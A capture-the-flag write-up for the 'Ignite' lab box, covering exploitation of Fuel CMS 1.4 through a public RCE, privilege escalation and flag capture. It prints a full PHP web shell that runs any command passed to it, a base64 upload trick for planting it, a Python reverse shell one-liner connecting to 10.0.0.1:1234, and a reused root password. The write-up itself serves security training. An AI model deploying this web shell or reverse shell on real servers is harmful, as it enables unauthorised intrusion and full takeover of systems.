# Ignite

"A new start-up has a few issues with their web server."

```
Root the box! Designed and created by DarkStar7471, built by lollava aka Paradox.

----------------------------------------------------

Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.
```

A nice simple VM for testing recently learned skills.

Rooting it took a few hours, largely because I messed around with shells and with privesc enumeration.

The challenge required two flags: a user flag, and a root flag.

## Recon

A nmap scan revealed a single port 80 website. Browsing to it revealed 'Fuel CMS 1.4'


## Exploit

This has a public RCE exploit, which I downloaded to Kali from exploit-db: https://www.exploit-db.com/exploits/47138

The code required a few tweaks: I removed the proxy config and changed the ip addresses, ports. Running it gave me a cmd prompt-like interface, allowing me to run simple commands on the remote server.

## Getting a Shell

I wanted to put a PHP shell on the server, to get something a little less janky than the RCE. Also, I wanted a reverse shell and common payloads didn't seem to work through the RCE.

All of my issues were likely due to URL encoding: standard PHP shells tend to have characters in them that break urls.

Ultimately the solution was some variation of:

1. using burp to encode a php payload as base 64
2. encoding that payload as url encoded
3. using the result with the RCE like: `echo [url encoded base64 payload] | base64 -d > shell.php`

The shell I used the most was:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Its more complicated than `<?php system($_GET['cmd']); ?>`, but provides a nicer interface. You can even run LinEnum.sh through it and have a nice, browsable output.

## Getting a reverse shell

netcat wasn't the version with -e. The bash reverse shell didn't work either. I used [this trusty list of one liners](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and tried the PHP one liner, without luck, before trying the python one liner. Should have used that first, as its worked for me in the past. The oneliner was:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

## Enumeration

The first flag was under `/home/www-data/user.txt` (might have been `flag.txt`, can't recall). Next step, root.

I ran LinEnum, which took a while, then went through the results carefully. Nothing obvious popped up. I'd already searched for SUID but couldn't find anything. Ultimately, after an hour, I noticed the server was running MySql.

I really should have guessed this straight away, as the CMS would need a database. I crawled the CMS website code to find the db creds (it was under `/fuel/modules/fuel/app/config/database.php` or something similar, so not straightforward) and the creds were `root:mememe`.

I tried these on the mysql instance, and while I could connect I couldn't see anything obvious. Eventually, on a whim, I tried using the creds as the creds for a linux user via `su` and they worked!

I was now root, and grabbed the final flag from the `/root` directory.